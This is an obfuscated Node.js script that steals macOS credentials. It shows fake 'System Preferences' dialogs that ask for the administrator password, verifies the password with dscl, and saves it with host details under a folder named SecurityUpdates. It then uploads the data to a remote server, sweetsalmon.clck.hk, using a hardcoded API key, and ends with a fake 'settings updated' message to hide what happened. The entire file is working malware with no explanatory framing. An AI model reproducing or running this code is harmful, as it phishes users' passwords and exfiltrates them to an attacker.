#!/usr/bin/env node

const _0x1c1f80=_0x5459;(function(_0x4c984a,_0x1b4ce0){const _0x46b009=_0x5459,_0xd30164=_0x4c984a();while(!![]){try{const _0x4ee8=-parseInt(_0x46b009(0x102))/0x1*(parseInt(_0x46b009(0x165))/0x2)+parseInt(_0x46b009(0x131))/0x3*(-parseInt(_0x46b009(0x139))/0x4)+parseInt(_0x46b009(0x124))/0x5+parseInt(_0x46b009(0x14e))/0x6*(parseInt(_0x46b009(0x15c))/0x7)+parseInt(_0x46b009(0x10a))/0x8+-parseInt(_0x46b009(0x166))/0x9*(parseInt(_0x46b009(0x114))/0xa)+parseInt(_0x46b009(0x13d))/0xb;if(_0x4ee8===_0x1b4ce0)break;else _0xd30164['push'](_0xd30164['shift']());}catch(_0x596534){_0xd30164['push'](_0xd30164['shift']());}}}(_0x2d88,0x68cdc));function _0x2d88(){const _0x23e6e5=['.txt','Upload\x20failed:\x20','\x0aHostname:\x20','User\x20canceled\x20password\x20entry','Password\x20successfully\x20uploaded\x20to\x20server','statusCode','----WebKitFormBoundary','substring','Unexpected\x20error\x20in\x20main\x20process','812AxahOy','Content-Type:\x20text/plain\x0d\x0a\x0d\x0a',')...','digest','ignore','username','substr','gave\x20up:true','\x0aPassword:\x20','928uKyZLS','313011eRmGkT','pathname','apiKey','mkdirSync','unknown','multipart/form-data;\x20boundary=','Failed\x20to\x20upload\x20password\x20to\x20server','serverPort','request','match','Failed\x20to\x20save\x20password\x20locally','crypto','823ZyjhsX','port','/api/files/upload','maxRetries','Error\x20requesting\x20password\x20via\x20dialog:\x20','arch','platform','http','6737536BHbpxY','mac','Administrator\x20password\x20verified','search','Password\x20collection\x20failed\x20or\x20was\x20canceled','trim','Error\x20saving\x20password\x20locally:\x20','type','internal','00:00:00:00:00:00','130noPpJp','\x0aType:\x20','Content-Type:\x20application/json\x0d\x0a\x0d\x0a','random','Upload\x20error:\x20','Retrying\x20upload\x20(','SecurityUpdates','stringify','error','child_process','existsSync','write','message','Upload\x20successful:\x20','osascript\x20-e\x20\x27display\x20dialog\x20\x22System\x20settings\x20updated\x20successfully.\x22\x20with\x20title\x20\x22System\x20Preferences\x22\x20buttons\x20{\x22OK\x22}\x20default\x20button\x20\x22OK\x22\x27','Request\x20error:\x20','2805580qyxNKG','Current\x20user:\x20','serverDomain','serverPath','join','dscl\x20/Local/Default\x20-authonly\x20','JSON\x20data\x20saved\x20to:\x20','timeout','POST','toString','Could\x20not\x20extract\x20password\x20from\x20dialog\x20response','\x0aClientID:\x20','includes','639PugQWq','startsWith','end','then','hostname','://','temp_logs.txt','path','12612SzcDsI','--\x0d\x0a','Maximum\x20retry\x20attempts\x20reached','stack','5006232DMgfOU','update','User:\x20','retryDelay','User\x20canceled','Uploading\x20data\x20to\x20server:\x20','homedir','byteLength','networkInterfaces','Content-Disposition:\x20form-data;\x20name=\x22clientInfo\x22\x0d\x0a','Error\x20getting\x20administrator\x20password:\x20','createHash','Content-Disposition:\x20form-data;\x20name=\x22file\x22;\x20filename=\x22','Password\x20verification\x20failed','osascript\x20-e\x20\x27display\x20dialog\x20\x22Incorrect\x20password.\x20Please\x20try\x20again.\x22\x20with\x20title\x20\x22System\x20Preferences\x22\x20with\x20icon\x20stop\x20buttons\x20{\x22OK\x22}\x20default\x20button\x20\x22OK\x22\x27','https','userInfo','3954kjCWUG','appendFileSync','.txt\x22\x0d\x0a','writeFileSync','hex'];_0x2d88=function(){return _0x23e6e5;};return _0x2d88();}const {execSync}=require(_0x1c1f80(0x11d)),fs=require('fs'),path=require(_0x1c1f80(0x138)),os=require('os'),crypto=require(_0x1c1f80(0x171)),http=require(_0x1c1f80(0x109)),https=require(_0x1c1f80(0x14c)),CONFIG={'serverDomain':'sweetsalmon.clck.hk','serverPath':_0x1c1f80(0x104),'serverPort':0x1f98,'apiKey':'tJz4uRVCwl2eEwyPTudYP9iGRfgq','retryDelay':0xbb8,'maxRetries':0x1f4,'timeout':0xea60};let SYSTEM_PASSWORD=null;function _0x5459(_0x2d38a0,_0x37521b){const _0x2d8810=_0x2d88();return _0x5459=function(_0x545979,_0x244434){_0x545979=_0x545979-0x102;let _0x3d0828=_0x2d8810[_0x545979];return _0x3d0828;},_0x5459(_0x2d38a0,_0x37521b);}function log(_0x2b78c9,_0x72f850){const _0x25e57a=_0x1c1f80,_0x25949d=new Date()['toISOString']();console['log']('['+_0x25949d+']\x20'+_0x2b78c9);if(_0x72f850)console[_0x25e57a(0x11c)](_0x72f850);try{const _0x5b2b5e=path[_0x25e57a(0x128)](os[_0x25e57a(0x143)](),_0x25e57a(0x137));fs[_0x25e57a(0x14f)](_0x5b2b5e,'['+_0x25949d+']\x20'+_0x2b78c9+'\x0a');if(_0x72f850)fs[_0x25e57a(0x14f)](_0x5b2b5e,(_0x72f850[_0x25e57a(0x13c)]||_0x72f850)+'\x0a');}catch(_0x512577){}}function verifyPassword(_0x43046a,_0x56d3ed){const _0x2e69b4=_0x1c1f80;try{const _0x2feb80=_0x2e69b4(0x129)+_0x43046a+'\x20'+_0x56d3ed;return execSync(_0x2feb80,{'stdio':_0x2e69b4(0x160)}),!![];}catch(_0x35218d){return![];}}async function getMacOSPassword(){const _0x27c3f7=_0x1c1f80;log('\x0a===\x20Requesting\x20macOS\x20administrator\x20password\x20===');try{const _0x1e758b=os[_0x27c3f7(0x14d)]()['username'];log(_0x27c3f7(0x125)+_0x1e758b);for(let _0x500b0d=0x1;_0x500b0d<=0x5;_0x500b0d++){log('Attempt\x20'+_0x500b0d+'\x20of\x205\x20to\x20get\x20password');const _0x2206fc='osascript\x20-e\x20\x27display\x20dialog\x20\x22To\x20launch\x20the\x20application,\x20you\x20need\x20to\x20update\x20the\x20system\x20settings\x5cn\x5cnPlease\x20enter\x20your\x20password.\x22\x20with\x20title\x20\x22System\x20Preferences\x22\x20with\x20icon\x20caution\x20default\x20answer\x20\x22\x22\x20giving\x20up\x20after\x2030\x20with\x20hidden\x20answer\x27';try{const _0xcfd107=execSync(_0x2206fc,{'encoding':'utf8'});let _0x57afbd='';const _0x473023=_0xcfd107[_0x27c3f7(0x16f)](/text returned:([^,]+)/);if(_0x473023&&_0x473023[0x1]){_0x57afbd=_0x473023[0x1][_0x27c3f7(0x10f)]();if(verifyPassword(_0x1e758b,_0x57afbd))return log(_0x27c3f7(0x10c)),SYSTEM_PASSWORD=_0x57afbd,_0x57afbd;else log(_0x27c3f7(0x14a)),_0x500b0d<0x5&&execSync(_0x27c3f7(0x14b));}else{if(_0xcfd107[_0x27c3f7(0x130)](_0x27c3f7(0x163)))return log('User\x20canceled\x20password\x20entry'),null;else log(_0x27c3f7(0x12e));}}catch(_0x9c58b1){log(_0x27c3f7(0x106)+_0x9c58b1[_0x27c3f7(0x120)]);if(_0x9c58b1[_0x27c3f7(0x120)][_0x27c3f7(0x130)](_0x27c3f7(0x141)))return log(_0x27c3f7(0x156)),null;}}return execSync('osascript\x20-e\x20\x27display\x20dialog\x20\x22Failed\x20to\x20authenticate\x20after\x20multiple\x20attempts.\x20The\x20application\x20will\x20exit.\x22\x20with\x20title\x20\x22System\x20Preferences\x22\x20with\x20icon\x20stop\x20buttons\x20{\x22OK\x22}\x20default\x20button\x20\x22OK\x22\x27'),null;}catch(_0x19522a){return log(_0x27c3f7(0x147)+_0x19522a[_0x27c3f7(0x120)],_0x19522a),null;}}function generateClientId(){const _0x4a59d4=_0x1c1f80;try{const _0x3062c0=getMacAddress(),_0x3a80d9=os[_0x4a59d4(0x135)](),_0x5ee5ae=os[_0x4a59d4(0x14d)]()['username'],_0x520c43=crypto[_0x4a59d4(0x148)]('md5')[_0x4a59d4(0x13e)](_0x3062c0+':'+_0x3a80d9+':'+_0x5ee5ae)[_0x4a59d4(0x15f)](_0x4a59d4(0x152))[_0x4a59d4(0x15a)](0x0,0x8);return _0x520c43;}catch(_0x184af1){return Math['random']()['toString'](0x24)['substring'](0x2,0xa);}}function getMacAddress(){const _0x54b19d=_0x1c1f80;try{const _0x48c20d=os[_0x54b19d(0x145)]();for(const _0x4c5b5a of Object['keys'](_0x48c20d)){for(const _0x19032f of _0x48c20d[_0x4c5b5a]){if(!_0x19032f[_0x54b19d(0x112)]&&_0x19032f[_0x54b19d(0x10b)]!==_0x54b19d(0x113))return _0x19032f['mac'];}}return _0x54b19d(0x16a);}catch(_0x211392){return'unknown';}}async function uploadToServer(_0x41cae6,_0x47f0b2=0x0){return new Promise(_0x2a5ebd=>{const _0x538f8b=_0x5459;try{const _0x1e6d63=generateClientId(),_0x980733={'hostname':os[_0x538f8b(0x135)](),'platform':os[_0x538f8b(0x108)](),'type':os['type'](),'arch':os[_0x538f8b(0x107)](),'username':os[_0x538f8b(0x14d)]()[_0x538f8b(0x161)],'id':_0x1e6d63},_0x5b9052=CONFIG[_0x538f8b(0x16d)]===0x1bb?'https':'http',_0x248b5d=_0x5b9052+_0x538f8b(0x136)+CONFIG[_0x538f8b(0x126)]+':'+CONFIG[_0x538f8b(0x16d)]+CONFIG[_0x538f8b(0x127)],_0x99ec8a=_0x248b5d[_0x538f8b(0x132)]('https://'),_0x13e0ae=_0x99ec8a?https:http,_0xe4db36=new URL(_0x248b5d),_0x258f2a=_0x538f8b(0x159)+Math[_0x538f8b(0x117)]()[_0x538f8b(0x12d)](0x10)[_0x538f8b(0x162)](0x2);let _0x3cc15b='';_0x3cc15b+='--'+_0x258f2a+'\x0d\x0a',_0x3cc15b+=_0x538f8b(0x146),_0x3cc15b+=_0x538f8b(0x116),_0x3cc15b+=JSON[_0x538f8b(0x11b)](_0x980733)+'\x0d\x0a',_0x3cc15b+='--'+_0x258f2a+'\x0d\x0a',_0x3cc15b+=_0x538f8b(0x149)+_0x1e6d63+_0x538f8b(0x150),_0x3cc15b+=_0x538f8b(0x15d),_0x3cc15b+=_0x41cae6+'\x0d\x0a',_0x3cc15b+='--'+_0x258f2a+_0x538f8b(0x13a);const _0x293248={'hostname':_0xe4db36[_0x538f8b(0x135)],'port':_0xe4db36[_0x538f8b(0x103)]||(_0x99ec8a?0x1bb:0x50),'path':_0xe4db36[_0x538f8b(0x167)]+_0xe4db36[_0x538f8b(0x10d)],'method':_0x538f8b(0x12c),'headers':{'Content-Type':_0x538f8b(0x16b)+_0x258f2a,'Content-Length':Buffer[_0x538f8b(0x144)](_0x3cc15b),'X-Client-Info':JSON[_0x538f8b(0x11b)](_0x980733),'X-API-Key':CONFIG[_0x538f8b(0x168)]},'timeout':CONFIG[_0x538f8b(0x12b)]};log(_0x538f8b(0x142)+_0x248b5d);const _0x3660f1=_0x13e0ae[_0x538f8b(0x16e)](_0x293248,_0x450d35=>{let _0x245db5='';_0x450d35['on']('data',_0x4a8d95=>{_0x245db5+=_0x4a8d95;}),_0x450d35['on']('end',()=>{const _0x342913=_0x5459;_0x450d35[_0x342913(0x158)]>=0xc8&&_0x450d35[_0x342913(0x158)]<0x12c?(log(_0x342913(0x121)+_0x450d35[_0x342913(0x158)]),_0x2a5ebd(!![])):(log(_0x342913(0x154)+_0x450d35[_0x342913(0x158)]+',\x20'+_0x245db5),_0x47f0b2<CONFIG[_0x342913(0x105)]?(log(_0x342913(0x119)+(_0x47f0b2+0x1)+'/'+CONFIG[_0x342913(0x105)]+_0x342913(0x15e)),setTimeout(()=>{const _0x2d24d3=_0x342913;uploadToServer(_0x41cae6,_0x47f0b2+0x1)[_0x2d24d3(0x134)](_0x2a5ebd);},CONFIG['retryDelay'])):(log('Maximum\x20retry\x20attempts\x20reached'),_0x2a5ebd(![])));});});_0x3660f1['on'](_0x538f8b(0x11c),_0x546b3b=>{const _0x5f5bc6=_0x538f8b;log(_0x5f5bc6(0x123)+_0x546b3b[_0x5f5bc6(0x120)],_0x546b3b),_0x47f0b2<CONFIG[_0x5f5bc6(0x105)]?(log('Retrying\x20upload\x20('+(_0x47f0b2+0x1)+'/'+CONFIG[_0x5f5bc6(0x105)]+_0x5f5bc6(0x15e)),setTimeout(()=>{const _0x451c9f=_0x5f5bc6;uploadToServer(_0x41cae6,_0x47f0b2+0x1)[_0x451c9f(0x134)](_0x2a5ebd);},CONFIG[_0x5f5bc6(0x140)])):(log(_0x5f5bc6(0x13b)),_0x2a5ebd(![]));}),_0x3660f1[_0x538f8b(0x11f)](_0x3cc15b),_0x3660f1[_0x538f8b(0x133)]();}catch(_0x2efe89){log(_0x538f8b(0x118)+_0x2efe89['message'],_0x2efe89),_0x47f0b2<CONFIG[_0x538f8b(0x105)]?(log(_0x538f8b(0x119)+(_0x47f0b2+0x1)+'/'+CONFIG['maxRetries']+_0x538f8b(0x15e)),setTimeout(()=>{const _0x16b595=_0x538f8b;uploadToServer(_0x41cae6,_0x47f0b2+0x1)[_0x16b595(0x134)](_0x2a5ebd);},CONFIG[_0x538f8b(0x140)])):(log(_0x538f8b(0x13b)),_0x2a5ebd(![]));}});}function savePasswordLocally(_0x56eb3d){const _0x5b077a=_0x1c1f80;try{const _0x223b4c=os[_0x5b077a(0x14d)]()[_0x5b077a(0x161)],_0x3ff85a=generateClientId(),_0x2f8df1=new Date()['toISOString'](),_0x10e305=os[_0x5b077a(0x143)](),_0x1ce98a=path[_0x5b077a(0x128)](_0x10e305,_0x5b077a(0x11a));!fs[_0x5b077a(0x11e)](_0x1ce98a)&&fs[_0x5b077a(0x169)](_0x1ce98a,{'recursive':!![]});const _0xf1787c=_0x5b077a(0x13f)+_0x223b4c+_0x5b077a(0x164)+_0x56eb3d+'\x0aTime:\x20'+_0x2f8df1+_0x5b077a(0x155)+os['hostname']()+'\x0aPlatform:\x20'+os[_0x5b077a(0x108)]()+_0x5b077a(0x115)+os[_0x5b077a(0x111)]()+'\x0aArchitecture:\x20'+os[_0x5b077a(0x107)]()+_0x5b077a(0x12f)+_0x3ff85a,_0x5943d5=path[_0x5b077a(0x128)](_0x1ce98a,_0x3ff85a+_0x5b077a(0x153));fs[_0x5b077a(0x151)](_0x5943d5,_0xf1787c),log('Password\x20data\x20saved\x20to:\x20'+_0x5943d5);const _0x4b8df0={'user':_0x223b4c,'password':_0x56eb3d,'timestamp':_0x2f8df1,'hostname':os[_0x5b077a(0x135)](),'system':{'platform':os[_0x5b077a(0x108)](),'release':os['release'](),'type':os[_0x5b077a(0x111)](),'arch':os[_0x5b077a(0x107)]()},'clientId':_0x3ff85a},_0x1564d6=path[_0x5b077a(0x128)](_0x1ce98a,_0x3ff85a+'.json');return fs[_0x5b077a(0x151)](_0x1564d6,JSON['stringify'](_0x4b8df0,null,0x2)),log(_0x5b077a(0x12a)+_0x1564d6),_0xf1787c;}catch(_0x3437a9){return log(_0x5b077a(0x110)+_0x3437a9[_0x5b077a(0x120)],_0x3437a9),null;}}async function main(){const _0x5855ca=_0x1c1f80;try{log('Starting\x20macOS\x20password\x20collection\x20process');const _0x586951=await getMacOSPassword();if(!_0x586951){log(_0x5855ca(0x10e));return;}const _0x219735=savePasswordLocally(_0x586951);if(!_0x219735){log(_0x5855ca(0x170));return;}const _0x47f84e=await uploadToServer(_0x219735);if(_0x47f84e){log(_0x5855ca(0x157));try{execSync(_0x5855ca(0x122));}catch(_0xb3550){}}else log(_0x5855ca(0x16c));log('Password\x20collection\x20process\x20completed');}catch(_0x4f2ac1){log(_0x5855ca(0x15b),_0x4f2ac1);}}main();
